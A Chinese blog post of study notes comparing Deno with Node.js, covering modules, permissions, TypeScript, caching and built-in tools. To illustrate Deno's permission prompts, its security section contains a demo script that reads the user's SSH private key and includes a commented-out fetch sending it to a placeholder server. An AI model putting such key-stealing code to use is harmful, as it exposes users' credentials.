---
title: Deno VS Node
date: 2022-3-26 23:59:59
categories: 
  - [前端, Deno]
tags:
  - Deno
  - Node
  - 学习笔记
  - redrock
top_img: https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/6/30/17302f0967644b1f~tplv-t2oaga2asx-zoom-in-crop-mark:1304:0:0:0.awebp
cover: https://i.ytimg.com/vi/lcoU9jtsK24/maxresdefault.jpg
---

# Deno VS Node

<img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/6/30/17302f0967644b1f~tplv-t2oaga2asx-zoom-in-crop-mark:1304:0:0:0.awebp" alt="img" style="zoom:50%;" />

**Deno** 是 **Ryan Dahl** 在2017年创立的。**Ryan Dahl** 也是 **Node.js** 的创始人，2012年后，他把 **Node.js** 移交给了其他开发者。

跟 Node.js 一样，Deno 也是一个运行时环境，但是支持多种语言，可以直接运行 JavaScript、TypeScript 和 WebAssembly 程序。

Deno是建立在：

- [Rust](https://www.rust-lang.org/zh-CN/)（Deno 的底层是用 Rust 开发，而 Node 是用 C++；正因如此，由于 Rust 原生支持 WebAssembly，所以Deno也能直接运行 WebAssembly）
- [Tokio](https://tokio-zh.github.io/)（Deno 的事件机制是基于 Tokio，而 Node 是基于 libuv）
- [TypeScript](https://www.typescriptlang.org/)
- [V8](https://v8.dev/)（用来解释 JavaScript）
- tsc（解释 TypeScript）

Deno **只有一个可执行文件**，所有操作都通过这个文件完成。它支持跨平台（Mac、Linux、Windows）。

## Deno的架构

<img src="https://www.zoo.team/images/upload/upload_b81b0e34dcf79dbed0dcad2412086336.png" alt="deno源码.png" style="zoom:50%;" />

1. Deno 以 Rust 作为启动入口，通过 Rust FFI 去执行 C++ 代码，然后在 C++ 中引入 V8 实例。
2. 初始化 V8 对象以及注入外部 C++ 方法，例如 send、recv 等方法。
3. 向 V8 全局作用域下注入 Deno 对象，暴露 Deno 的一些基本 API 给 JavaScript。
4. 通过绑定在 V8 上的 C++ 方法，调用对应的 Rust 方法，去执行底层逻辑。

## Download Deno

在 macOS 平台可以安装 M1 (arm64) 和 Intel (x64) 架构的可执行文件。在 Linux 和 Windows 只能安装 x64 架构的。

[deno_install](https://github.com/denocn/deno_install)为下载和安装二进制提供了快捷简便的脚本。

使用 Shell（macOS 和 Linux）：

```shell
curl -fsSL https://x.deno.js.cn/install.sh | sh
```

使用 PowerShell（Windows）：

```shell
iwr https://x.deno.js.cn/install.ps1 -useb | iex
```

## Deno的相关网站

- deno官网：https://deno.land/
- deno.land：https://deno.land/x
- deno手册：https://nugine.github.io/deno-manual-cn/
- denoAPI: https://doc.deno.land/deno/stable

## Node的缺陷

- 过去五六年，JavaScript 脱胎换骨，ES6 新增了大量的语法特性。其中，影响最大的语法有两个：Promise 接口（以及 async/await）和 ESM 。但Node.js 对这两个新语法的支持，都不理想。

  由于历史原因，Node.js 必须支持回调函数（callback），导致异步接口会有 Promise 和回调函数两种写法；

  同时，Node.js 原先的 CommonJS 与 ESM 不兼容（通常情况下， CommonJS 不能加载 ESM，ESM 可以加载 CommonJS ），导致迟迟无法完全支持 ESM。

- 复杂的包管理模式

  Node.js 的模块管理工具 npm，逻辑越来越复杂；模块安装目录 node_modules 极其庞杂，难以管理。

  <img src="https://www.zoo.team/images/upload/upload_0868aecff4d064301d0eeb570e69018f.png" alt="deno模块太阳.png" style="zoom: 33%;" />

  Node 自带的 NPM 生态系统中，由于严重依赖语义版本控制和复杂的依赖关系图，少不了要与 package.json、node_modules 打交道。node_modules 的设计虽然能满足大部分的场景，但是其仍然存在着种种缺陷，尤其在前端工程化领域，造成了不少的问题。特别是不同包依赖版本不一致时，各种问题接踵而来，于是乎 yarn lock、npm lock 闪亮登场。

  然而还是有很多场景是 lock 无法覆盖的，比如当我们第一次安装某个依赖的时候，此时即使第三方库里含有 lock 文件，但是 npm install|、yarn install 也不会去读取第三方依赖的 lock，这导致第一次创建项目的时候，还是会可能会触发 bug。而且由于交叉依赖，node_modules 里充满了各种重复版本的包，造成了极大的空间浪费，也导致 install 依赖包很慢，以及 require 读取文件的算法越来越复杂化。

- 缺少安全性

  在 Node 中，可以调用 fs.chmod 来修改文件或目录的读写权限。说明 Node 运行时的权限是很高的。如果你在 Node 中导入一份不受信任的软件包，那么很可能它将删除你计算机上的所有文件，所以说 Node 缺少安全模块化运行时。除非手动提供一个沙箱环境，诸如 Docker 这类的容器环境来解决安全性问题。


- Node.js 的功能也不完整，导致外部工具层出不穷，让开发者疲劳不堪：webpack，babel，typescript、eslint、prettier......

- 构建系统与 Chrome 存在差异

  首先我们需要了解构建系统是啥？写惯前端的童鞋可能不是很明白这个东西是干啥用的？但是其实平时你都会接触到，只是概念不同而已。前端我们一般称其为打包构建，类似工具诸如 webpack、rollup、parcel 做的事情。它们最后的目标其实都是想得到一些目标性的文件，这里我们的目标是[编译 V8 ](https://link.juejin.cn?target=https%3A%2F%2Fv8.dev%2Fdocs%2Fbuild-gn)代码。

  <img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/524c9f24d50e4c73b8d3b5eb1654d007~tplv-k3u1fbpfcp-zoom-in-crop-mark:1304:0:0:0.awebp" alt="v8编译.png" style="zoom:50%;" />

  Node 的 V8 构建系统是 [GYP](https://link.juejin.cn?target=https%3A%2F%2Fgyp.gsrc.io%2F)（Generate Your Projects），而 Chrome 的 V8 已升级为 [GN](https://link.juejin.cn?target=https%3A%2F%2Fchromium.googlesource.com%2Fchromium%2Fsrc%2Ftools%2Fgn%2F%2B%2F48062805e19b4697c5fbd926dc649c78b6aaa138%2FREADME.md)（Generate Ninja）。我们知道 V8 是由 Google 开发的，这也证明 Node 和 Google 的亲儿子 Chrome 渐行渐远，而且 GN 的构建速度比 GYP 快20倍，因为 GN 是用 C++ 编写，比起用 python 写的 GYP 快了很多。但是 Node 底层架构已无法挽回


由于上面这些原因，Ryan Dahl 决定放弃 Node.js，从头写一个替代品，彻底解决这些问题。deno 这个名字就是来自 Node  的字母重新组合（Node = no + de），表示"拆除 Node.js"（de = destroy, no = Node.js）。

## Deno VS Node

|                    | Node                                     | Deno                 |
| ------------------ | ---------------------------------------- | -------------------- |
| API 引用方式       | 模块导入                                 | 全局对象             |
| 模块系统           | CommonJS & 新版 node 实验性 ES Module    | ES Module 浏览器实现 |
| 安全               | 无安全限制                               | 默认安全             |
| Typescript         | 第三方，如通过 ts-node 支持              | 原生支持             |
| 包管理             | npm + node_modules                       | 原生支持             |
| 异步操作           | 回调                                     | Promise              |
| 包分发             | 中心化 npmjs.com                         | 去中心化 import url  |
| 入口               | package.json 配置                        | import url 直接引入  |
| 打包、测试、格式化 | 第三方如 eslint、gulp、webpack、babel 等 | 原生支持             |

### API 引用方式

### 内置 API 引用方式不同

- node 模块导入

  node 内置 API 通过模块导入的方式引用，例如：

  ```js
  const { readFile } = require('fs');
  // import { readFile } from 'fs';
  
  readFile('context.txt', { encoding: 'utf-8' }, (err, data) => {
      console.log(data);
  })
  ```

- deno全局对象

  我们可以先 `console.log(Deno)` :

  ```powershell
  {
    core: {
      opcallSync: [Function: opcallSync],
      opcallAsync: [Function: opcallAsync],
      refOp: [Function: refOp],
      unrefOp: [Function: unrefOp],
      setMacrotaskCallback: [Function: setMacrotaskCallback],
      setNextTickCallback: [Function: setNextTickCallback],
      setPromiseRejectCallback: [Function: setPromiseRejectCallback],
      setUncaughtExceptionCallback: [Function: setUncaughtExceptionCallback],
      runMicrotasks: [Function: runMicrotasks],
      hasTickScheduled: [Function: hasTickScheduled],
      setHasTickScheduled: [Function: setHasTickScheduled],
      evalContext: [Function: evalContext],
      encode: [Function: encode],
      decode: [Function: decode],
      serialize: [Function: serialize],
      deserialize: [Function: deserialize],
      getPromiseDetails: [Function: getPromiseDetails],
      getProxyDetails: [Function: getProxyDetails],
      isProxy: [Function: isProxy],
      memoryUsage: [Function: memoryUsage],
      callConsole: [Function: callConsole],
      createHostObject: [Function: createHostObject],
      setWasmStreamingCallback: [Function: setWasmStreamingCallback],
      opAsync: [Function: opAsync],
      opSync: [Function: opSync],
      ops: [Function: ops],
      close: [Function: close],
      tryClose: [Function: tryClose],
      read: [Function: read],
      write: [Function: write],
      shutdown: [Function: shutdown],
      print: [Function: print],
      resources: [Function: resources],
      metrics: [Function: metrics],
      registerErrorBuilder: [Function: registerErrorBuilder],
      registerErrorClass: [Function: registerErrorClass],
      opresolve: [Function: opresolve],
      syncOpsCache: [Function: syncOpsCache],
      BadResource: [Function: BadResource],
      BadResourcePrototype: undefined,
      Interrupted: [Function: Interrupted],
      InterruptedPrototype: undefined,
      enableOpCallTracing: [Function: enableOpCallTracing],
      opCallTraces: Map {},
      createPrepareStackTrace: [Function: createPrepareStackTrace]
    },
    internal: Symbol(Deno.internal),
    resources: [Function: resources],
    close: [Function: close],
    metrics: [Function: metrics],
    test: [Function: test],
    Process: [Function: Process],
    run: [Function: run],
    isatty: [Function: isatty],
    writeFileSync: [Function: writeFileSync],
    writeFile: [AsyncFunction: writeFile],
    writeTextFileSync: [Function: writeTextFileSync],
    writeTextFile: [Function: writeTextFile],
    readTextFile: [AsyncFunction: readTextFile],
    readTextFileSync: [Function: readTextFileSync],
    readFile: [AsyncFunction: readFile],
    readFileSync: [Function: readFileSync],
    watchFs: [Function: watchFs],
    chmodSync: [Function: chmodSync],
    chmod: [AsyncFunction: chmod],
    chown: [AsyncFunction: chown],
    chownSync: [Function: chownSync],
    copyFileSync: [Function: copyFileSync],
    cwd: [Function: cwd],
    makeTempDirSync: [Function: makeTempDirSync],
    makeTempDir: [Function: makeTempDir],
    makeTempFileSync: [Function: makeTempFileSync],
    makeTempFile: [Function: makeTempFile],
    memoryUsage: [Function: memoryUsage],
    mkdirSync: [Function: mkdirSync],
    mkdir: [AsyncFunction: mkdir],
    chdir: [Function: chdir],
    copyFile: [AsyncFunction: copyFile],
    readDirSync: [Function: readDirSync],
    readDir: [Function: readDir],
    readLinkSync: [Function: readLinkSync],
    readLink: [Function: readLink],
    realPathSync: [Function: realPathSync],
    realPath: [Function: realPath],
    removeSync: [Function: removeSync],
    remove: [AsyncFunction: remove],
    renameSync: [Function: renameSync],
    rename: [AsyncFunction: rename],
    version: { deno: "1.19.2", v8: "9.9.115.7", typescript: "4.5.2" },
    build: {
      target: "x86_64-pc-windows-msvc",
      arch: "x86_64",
      os: "windows",
      vendor: "pc",
      env: "msvc"
    },
    statSync: [Function: statSync],
    lstatSync: [Function: lstatSync],
    stat: [AsyncFunction: stat],
    lstat: [AsyncFunction: lstat],
    truncateSync: [Function: truncateSync],
    truncate: [AsyncFunction: truncate],
    ftruncateSync: [Function: ftruncateSync],
    ftruncate: [AsyncFunction: ftruncate],
    errors: {
      NotFound: [Function: NotFound],
      PermissionDenied: [Function: PermissionDenied],
      ConnectionRefused: [Function: ConnectionRefused],
      ConnectionReset: [Function: ConnectionReset],
      ConnectionAborted: [Function: ConnectionAborted],
      NotConnected: [Function: NotConnected],
      AddrInUse: [Function: AddrInUse],
      AddrNotAvailable: [Function: AddrNotAvailable],
      BrokenPipe: [Function: BrokenPipe],
      AlreadyExists: [Function: AlreadyExists],
      InvalidData: [Function: InvalidData],
      TimedOut: [Function: TimedOut],
      Interrupted: [Function: Interrupted],
      WriteZero: [Function: WriteZero],
      UnexpectedEof: [Function: UnexpectedEof],
      BadResource: [Function: BadResource],
      Http: [Function: Http],
      Busy: [Function: Busy],
      NotSupported: [Function: NotSupported]
    },
    customInspect: Symbol(Deno.customInspect),
    inspect: [Function: inspect],
    env: {
      get: [Function: getEnv],
      toObject: [Function: toObject],
      set: [Function: setEnv],
      delete: [Function: deleteEnv]
    },
    exit: [Function: exit],
    execPath: [Function: execPath],
    Buffer: [Function: Buffer],
    readAll: [AsyncFunction: readAll],
    readAllSync: [Function: readAllSync],
    writeAll: [AsyncFunction: writeAll],
    writeAllSync: [Function: writeAllSync],
    copy: [AsyncFunction: copy],
    iter: [AsyncGeneratorFunction: iter],
    iterSync: [GeneratorFunction: iterSync],
    SeekMode: { "0": "Start", "1": "Current", "2": "End", Start: 0, Current: 1, End: 2 },
    read: [AsyncFunction: read],
    readSync: [Function: readSync],
    write: [Function: write],
    writeSync: [Function: writeSync],
    File: [Function: FsFile],
    FsFile: [Function: FsFile],
    open: [AsyncFunction: open],
    openSync: [Function: openSync],
    create: [Function: create],
    createSync: [Function: createSync],
    stdin: Stdin {},
    stdout: Stdout {},
    stderr: Stderr {},
    seek: [Function: seek],
    seekSync: [Function: seekSync],
    connect: [AsyncFunction: connect],
    listen: [Function: listen],
    connectTls: [AsyncFunction: connectTls],
    listenTls: [Function: listenTls],
    startTls: [AsyncFunction: startTls],
    shutdown: [Function: shutdown],
    fstatSync: [Function: fstatSync],
    fstat: [AsyncFunction: fstat],
    fsyncSync: [Function: fsyncSync],
    fsync: [AsyncFunction: fsync],
    fdatasyncSync: [Function: fdatasyncSync],
    fdatasync: [AsyncFunction: fdatasync],
    symlink: [AsyncFunction: symlink],
    symlinkSync: [Function: symlinkSync],
    link: [AsyncFunction: link],
    linkSync: [Function: linkSync],
    permissions: Permissions {},
    Permissions: [Function: Permissions],
    PermissionStatus: [Function: PermissionStatus],
    serveHttp: [Function: serveHttp],
    resolveDns: [Function: resolveDns],
    upgradeWebSocket: [Function: upgradeWebSocket],
    kill: [Function: opKill],
    addSignalListener: [Function: addSignalListener],
    removeSignalListener: [Function: removeSignalListener],
    pid: 17360,
    ppid: 51944,
    noColor: false,
    args: [],
    mainModule: [Getter],
    [Symbol(Deno.internal)]: {
      Console: [Function: Console],
      cssToAnsi: [Function: cssToAnsi],
      inspectArgs: [Function: inspectArgs],
      parseCss: [Function: parseCss],
      parseCssColor: [Function: parseCssColor],
      pathFromURL: [Function: pathFromURL],
      runTests: [AsyncFunction: runTests]
    }
  }
  ```
  
  可以发现全局对象 `Deno` 的属性和方法。。。。：
  
  所以如果我们想要实现node上面的读取文件功能的话，可以这么写：
  
  ```js
  const data = await Deno.readTextFile("context.txt");
  console.log(data);
  ```

### 模块化

- node CommonJS 规范

  node 采用的是 [CommonJS](https://link.juejin.cn?target=https%3A%2F%2Fjavascript.ruanyifeng.com%2Fnodejs%2Fmodule.html) 规范（如果想要使用ESM的话，需要将js文件的后缀名改为mjs）
  
- deno 则是采用的 **ES Module的浏览器实现**

  具体关于 [ES Module](https://link.juejin.cn?target=https%3A%2F%2Fes6.ruanyifeng.com%2F%23docs%2Fmodule) 想必大家都早已熟知，但其**浏览器实现**可能大家还不是很熟悉，所以我们先看一下其浏览器实现：	

  ```html
  <body>
    <!-- 注意这里一定要加上 type="module" -->
    <!-- 要开启本地服务器 -->
    <script type="module">
      // 从 URL 导入
      import Vue from "https://unpkg.com/vue@2.6.11/dist/vue.esm.browser.js";
      // 从相对路径导入
      import * as utils from "./utils.js";
      // 从绝对路径导入
      import "/index.js";
  
      // 不支持
      import foo from "foo.js"; // Uncaught TypeError: 解析模块说明符“foo.js”时出错。相关模块说明符必须以“./”, “../”或 “/”开头。
      import bar from "bar/index.js"; // Uncaught TypeError: 解析模块说明符“bar/index.js”时出错。相关模块说明符必须以“./”, “../”或 “/”开头。
      import zoo from "./index"; // 没有 .js 后缀
    </script>
  </body>
  ```

  deno 完全遵循 ES Module的浏览器实现：

  ```js
  // 支持
  import * as fs from "https://deno.land/std/fs/mod.ts";
  import { deepCopy } from "./deepCopy.js";
  import foo from "/foo.ts";
  
  // 不支持
  import foo from "foo.ts";
  import bar from "./bar"; // 必须指定扩展名
  ```
  
  我们发现其和我们平常在 webpack 或者 ts 使用 es module 最大的**不同**：
  
  - 可以通过 import url 直接引用线上资源；
  - 资源不可省略扩展名和文件名。
  
  关于第 1 点，其实是deno争议比较大的一点。
  
  有人很看好，觉得极大的扩展了 deno 库的范围；有人则不太看好，觉得国内网速的原因，并不实用。🤔

### 安全性

在介绍之前我们先思考一下这个场景会不会出现：

> 我做了一个基于命令行的一键上网工具 `breakwall`，每月 1 个 G 免费流量，然后将压缩后的 JS 代码发布到 npm 上，然后后在各种渠道宣传一波。
>
> 羊毛党兴高彩烈的 `cnpm install -g breakwall`，然后每次使用的时候，我偷偷的将诸位的 ssh 密钥和各种能偷的文档及图片偷偷上传到我的服务器，在设定期限到期后，删除电脑上资料，留下一句拿钱换资料，仅支持比特币。

#### 默认安全

在 Node 中，可以调用 fs.chmod 来修改文件或目录的读写权限。说明 Node 运行时的权限是很高的。如果你在 Node 中导入一份不受信任的软件包，那么很可能它将删除你计算机上的所有文件，所以说 Node 缺少安全模块化运行时。除非手动提供一个沙箱环境，诸如 Docker 这类的容器环境来解决安全性问题。所以上面的功能在Node中是可以实现的。

那么Deno呢？

我们先用 deno 执行以下代码：

```js
import dir from "https://deno.land/x/dir/mod.ts";

console.log(dir("home")) // C:\Users\MYY

const rsa = await Deno.readTextFile(dir("home") + "/.ssh/id_rsa"); // C:/Users/MYY/.ssh/id_rsa

// fetch("http://jsonplaceholder.typicode.com/posts/1", {
//     method: "POST",
//     body: JSON.stringify(rsa),
// })
//     .then((res) => res.json())
//     .then((res) => console.log("密钥发送成功，嘿嘿嘿😜"));

await Deno.writeTextFile("./key/id_rsa", rsa);
console.log('密钥写入成功，嘿嘿嘿😜');

console.log("start breakwall...");
// breakwall code
// ...
```

PS: 这里使用向key文件夹的id_rsa写入用户的id_rsa来代替将用户的id_rsa发送到服务器中

在Deno中，当我们执行 `deno run './demo2.js'` 时，这里可以看到终端会显示如下：

```bash
PS D:\FrontEndProject\deno-demo> deno run './demo2.js'
⚠️  ️Deno requests env access to "USERPROFILE". Run again with --allow-env to bypass this prompt.
   Allow? [y/n (y = yes allow, n = no deny)]  y
   Allow? [y/n (y = yes allow, n = no deny)]  y
⚠️  ️Deno requests read access to "C:\Users\MYY/.ssh/id_rsa". Run again with --allow-read to bypass this prompt.
   Allow? [y/n (y = yes allow, n = no deny)]  y
⚠️  ️Deno requests write access to "./key/id_rsa". Run again with --allow-write to bypass this prompt.
   Allow? [y/n (y = yes allow, n = no deny)]  y
密钥写入成功，嘿嘿嘿😜
start breakwall...
```

如果想要跳过，则可以执行 `deno run --allow-env --allow-read --allow-write  demo2.js` :

```bash
PS D:\FrontEndProject\deno-demo> deno run --allow-env --allow-read --allow-write  demo2.js
密钥写入成功，嘿嘿嘿😜
start breakwall...
```

#### 白名单

但如果我的应用确实是需要访问网络和文件，但是有不想让它访问 .ssh 文件有没有办法？

当然有了，我们可以给 `--allow-read` 和 `--allow-net` 指定白名单，名单之外都需要询问是否可以访问，例如：

```bash
PS D:\FrontEndProject\deno-demo> deno run --allow-env --allow-read --allow-write=D:\FrontEndProject\deno-demo\key\id_rsa  demo2.js
Check file:///D:/FrontEndProject/deno-demo/demo2.js
密钥写入成功，嘿嘿嘿😜
start breakwall...
```

#### 简化参数

如果确认是没问题，或者是自己开发软件时，图个方便，可以直接使用 `-A` 或 `--allow-all` 参数允许所有权限：

```bash
PS D:\FrontEndProject\deno-demo> deno run -A demo2.js
Check file:///D:/FrontEndProject/deno-demo/demo2.js
密钥写入成功，嘿嘿嘿😜
start breakwall...
```

安全这方面见仁见智，有人觉得是多余，有人觉得很好用，极大的增强了安全性。如果觉得这个功能多余的，可以 `deno run -A xxx` 即可。

### 兼容 Web API

关于为什么，我举个栗子大家就明白了：在设计 node 之处，关于输出函数本来叫 `print` 之类的，后来有人提议为什么不叫 `console.log`，ry 觉得挺不错，于是就接纳了意见。

但是，这个设计并不是刻意为之，而 deno 的设计则可以为之，通过与浏览器 API 保持一致，来**减少大家的认知**。

总体而言，如果服务端和浏览器端存在相同概念，deno 就不会创造新的概念。这一点其实 node 也在做，提及要实现 `Universal JavaScript` 和 `Spec compliance and Web Compatibility`的思想。

- 模块化规范，从上面介绍看出 deno 是完全遵循**ES Module的浏览器实现**的；

- 默认安全，当然也不是自己创造的概念，w3c 早已做出[浏览器权限](https://link.juejin.cn?target=https%3A%2F%2Fw3c.github.io%2Fpermissions%2F%23permission-registry)的规定，我们在做小程序的时候尤为明显，需要获取各种权限；

- 对于异步操作返回 Promise；

- 使用 ArrayBuffer 处理二进制；

- 存在 window 全局变量

  ```js
  console.log(window === this, window === self, window === globalThis); // false true true
  ```

- 实现了 [WindowOrWorkerGlobalScope](https://developer.mozilla.org/zh-CN/docs/Web/API/WindowOrWorkerGlobalScope) 的全部方法

  ```js
  // 请求方法
  fetch("https://baidu.com");
  
  // base64 转化
  let encodedData = btoa("Hello, world"); // 编码
  let decodedData = atob(encodedData); // 解码
  
  // 微任务
  queueMicrotask(() => {
    console.log(123);
  });
  
  // 等等...
  ```

### 支持TypeScript

```typescript
let str: string = "hello deno";
console.log(str);
```

```powershell
PS D:\FrontEndProject\deno-demo> deno run "d:\FrontEndProject\deno-demo\demo3.ts"
Check file:///D:/FrontEndProject/deno-demo/demo3.ts
hello deno
```

Deno 原生支持 TypeScript 语言，可以直接运行，不必显式转码。

它的内部会根据文件后缀名判断，如果是`.ts`后缀名，就先调用 TS 编译器，将其编译成 JavaScript；如果是`.js`后缀名，就直接传入 V8 引擎运行。

### 去node_modules

在Deno中，没有包管理器的概念，因为外部模块直接导入到本地模块中。

那么它是怎么进行包管理的呢？我们先看下面的例子

```js
import { red, bgYellow } from "https://deno.land/std/fmt/colors.ts";
console.log(bgYellow(red("hello world!")));
```

```powershell
PS D:\FrontEndProject\deno-demo> deno run demo4.js
Download https://deno.land/std/fmt/colors.ts
Warning Implicitly using latest version (0.132.0) for https://deno.land/std/fmt/colors.ts
Download https://deno.land/std@0.132.0/fmt/colors.ts
Check file:///D:/FrontEndProject/deno-demo/demo4.js
hello world!
```

看完这个例子会有几个疑问：

- **每次执行都会重新安装依赖吗？**

  我们只需要**再执行一次**就能明白

  ```powershell
  PS D:\FrontEndProject\deno-demo> deno run demo4.js   
  hello world!
  ```

  可以看见，并不会每次都重新安装依赖，依赖会被缓存起来

- **被缓存的依赖所在位置?**

  缓存的依赖放在哪里呢，我们可以使用下 `deno -h` 命令：

  ```powershell
  PS D:\FrontEndProject\deno-demo> deno -h
  deno 1.19.2
  
  USAGE:
      deno [OPTIONS] [SUBCOMMAND]
  
  OPTIONS:
      ...
  
  SUBCOMMANDS
      cache          Cache the dependencies
      info           Show info about cache or info related to source file
      ...
  
  ENVIRONMENT VARIABLES: # 环境变量
      DENO_DIR             Set the cache directory # 实际的安装依赖目录
      ...
  ```

  `deno info` 会展示与缓存有关的位置：
  
  ```powershell
  PS D:\FrontEndProject\deno-demo> deno info    
  DENO_DIR location: "C:\\Users\\MYY\\AppData\\Local\\deno"
  Remote modules cache: "C:\\Users\\MYY\\AppData\\Local\\deno\\deps"
  Emitted modules cache: "C:\\Users\\MYY\\AppData\\Local\\deno\\gen"
  Language server registries cache: "C:\\Users\\MYY\\AppData\\Local\\deno\\registries"
  Origin storage: "C:\\Users\\MYY\\AppData\\Local\\deno\\location_data"
  ```
  
  具体可看 https://segmentfault.com/a/1190000041178273
  
  `deno info xxx.js` 命令展示了依赖关系，类似 `package.json`
  
  ```powershell
  PS D:\FrontEndProject\deno-demo> deno info demo4.js
  local: D:\FrontEndProject\deno-demo\demo4.js
  type: JavaScript
  dependencies: 1 unique (total 11.7KB)
  
  file:///D:/FrontEndProject/deno-demo/demo4.js (113B)
  └── https://deno.land/std@0.132.0/fmt/colors.ts (11.59KB)
  ```

- **没网络了怎么办？**我们有些场景是将本地写好的代码部署到没有网络的服务器，那么当执行 `deno run xxx` 时，就是提示 error sending request。

  将上面的缓存目录内容，直接**拷贝到服务器**并指定环境变量到其目录即可。

- **依赖代码更新了怎么办？**

  当依赖模块更新时，我们可以通过 `--reload` 进行更新缓存，例如：

  ```powershell
  PS D:\FrontEndProject\deno-demo> deno run --reload demo4.js
  Download https://deno.land/std/fmt/colors.ts
  Warning Implicitly using latest version (0.132.0) for https://deno.land/std/fmt/colors.ts
  Download https://deno.land/std@0.132.0/fmt/colors.ts
  Check file:///D:/FrontEndProject/deno-demo/demo4.js
  hello world!
  ```

  我们还可以通过**白名单**的方式，只更新部分依赖。例如：

  ```powershell
  PS D:\FrontEndProject\deno-demo> deno run --reload=https://deno.land/x/dir/mod.ts  demo4.js
  Download https://deno.land/x/dir/mod.ts
  Warning Implicitly using latest version (v1.2.0) for https://deno.land/x/dir/mod.ts
  hello world!
  ```

- **仅缓存依赖，不执行代码有办法吗？**

  有的，我们可以通过 `deno cache xxx.js` 进行依赖缓存，这里的话就有点像 `npm install` 了

- **怎么管理项目依赖呢？**

  deno这种依赖引入方式像极了早年直接在 `HTML` 中引入 `jQuery` ，简单易懂。但当项目极小时，这种 absolute URL 的引入方式能帮助你快速开始一个项目，但当项目规模逐渐扩张后，目录结构开始变得复杂，开发协同人数也随之增加，这时候依赖管理就势在必行了。

  官方在手册中给出了方案 ([Linking to external code](https://link.juejin.cn?target=https%3A%2F%2Fdeno.land%2Fmanual%2Flinking_to_external_code%23it-seems-unwieldy-to-import-urls-everywhere))，创建一个中心 `deps.ts` 文件，引入并导出你所需要的模块，然后再在其他文件中从 `deps.ts` 引入，代码如下：
  
  ```js
  // deps.js 这里就直接使用js了
  export {
    ld
  } from "https://deno.land/x/deno_lodash/mod.ts";
  ```
  
  这种方式的话，存在很大的争议，有人觉得这实在是太糟糕了！不仅繁琐易出错，且引入来源模块名极不清晰，甚至还需要使用 `as` 处理可能出现命名空间重名问题

### 异步操作

> 根据 ry 自己的说法是，在设计 node 是有人提议 Promise 处理回调，但是他愚蠢的拒绝了...

node 用回调的方式处理异步操作、deno 则选择用 Promise

```js
// node 回调
const { readFile } = require('fs');
// import { readFile } from 'fs';

readFile('context.txt', { encoding: 'utf-8' }, (err, data) => {
    console.log(data);
})
```

```js
// Deno
const data = await Deno.readTextFile("context.txt");
console.log(data);
```

----

另外 deno 支持 `top-level-await`，所以以上读取文件的代码可以为：

```js
// deno 方式
const data = await Deno.readFile("./data.txt");
console.log(data);
```

node其实也是可以的，但是需要将js文件的后缀名改为mjs

### 单文件分发

我们知道 npm 包必须有 `package.json` 文件，里面不仅需要指明 `main` 或 `module` 或 `browser` 等字段来标明入口文件，还需要指明 `name` 、`license` 、`description` 等字段来说明这个包。

ry 觉得这些字段扰乱了开发者的视听，所以在 deno 中，其模块不需要任何配置文件，直接是 import url 的形式。

### 去中心化仓库

对于 www.npmjs.com 我们肯定都不陌生，它是推动 node 蓬勃发展的重要支点。但作者认为它是中心化仓库，违背了互联网去中心化原则。

所以 deno 并没有一个像 npmjs.com 的仓库，通过 import url 的方式将互联网任何一处的代码都可以引用。

PS：deno 其实是有个基于 GitHub 的[第三方模块集合](https://link.juejin.cn?target=https%3A%2F%2Fdeno.land%2Fx) ~~(展示下用法)~~

### 去开发依赖

我们在写一个 node 库或者工具时，开发依赖是少不了的，例如 babel 做转化和打包、jest 做测试、prettier 做代码格式化、eslint 做代码格式校检、gulp 或者 webpack 做构建等等，让我们搭建项目时就已经搞得筋疲力尽。

deno 通过内置了一些工具，解决上述问题。

- [deno bundle](https://deno.land/manual/tools/bundler)：打包命令，用来替换 `esbuild`、`gulp` 一类工具 

  例如：`deno bundle demo.js demo.bundle.js` 、`deno bundle demo.ts demo.bundle.js`

- [deno fmt](https://deno.land/manual/tools/formatter)：格式化命令，用来替换 `prettier` 一类工具

  例如：`deno fmt demo.ts`；

- [deno test](https://deno.land/manual/testing)：运行测试代码，用来替换 `jest` 一类工具

  例如 `deno test test.ts`；

- [deno lint](https://deno.land/manual/tools/linter)：代码校检，用来替换 `eslint` 一类工具

  例如：`deno lint mod.ts`

  ```js
  import {add,multiply} from './demo8.js'
  console.log(add(1, 2, 3, 4, 5           )
  );
  ```

  ```powershell
  PS D:\FrontEndProject\deno-demo> deno lint demo7.js  
  (no-unused-vars) `multiply` is never used
  import {add,multiply} from './demo8.js'
              ^^^^^^^^
      at D:\FrontEndProject\deno-demo\demo7.js:1:12
  
      hint: If this is intentional, alias it with an underscore like `multiply as _multiply`
      help: for further information visit https://lint.deno.land/#no-unused-vars
  
  Found 1 problem
  Checked 1 file
  ```

  可以看到，`linter`会对未使用的变量(multiply)进行报错

  但不会对代码格式有要求，这与`eslint`不同

  当然了，`linter`也是可以设置一些忽略条件的，如：

  ```js
  // deno-lint-ignore-file no-unused-vars
  import { add,multiply } from './demo8.js'
  console.log(add(1, 2, 3, 4, 5    ) );
  ```

  ```powershell
  PS D:\FrontEndProject\deno-demo> deno lint demo7.js
  Checked 1 file
  ```

  这样的话，就不会报错，通过了`linter`的检查

## 后话

。。。

## ref

https://juejin.cn/post/6844904158617665544

https://www.ruanyifeng.com/blog/2020/01/deno-intro.html

https://juejin.cn/post/6844904158512807949

https://juejin.cn/post/6961201207964598286

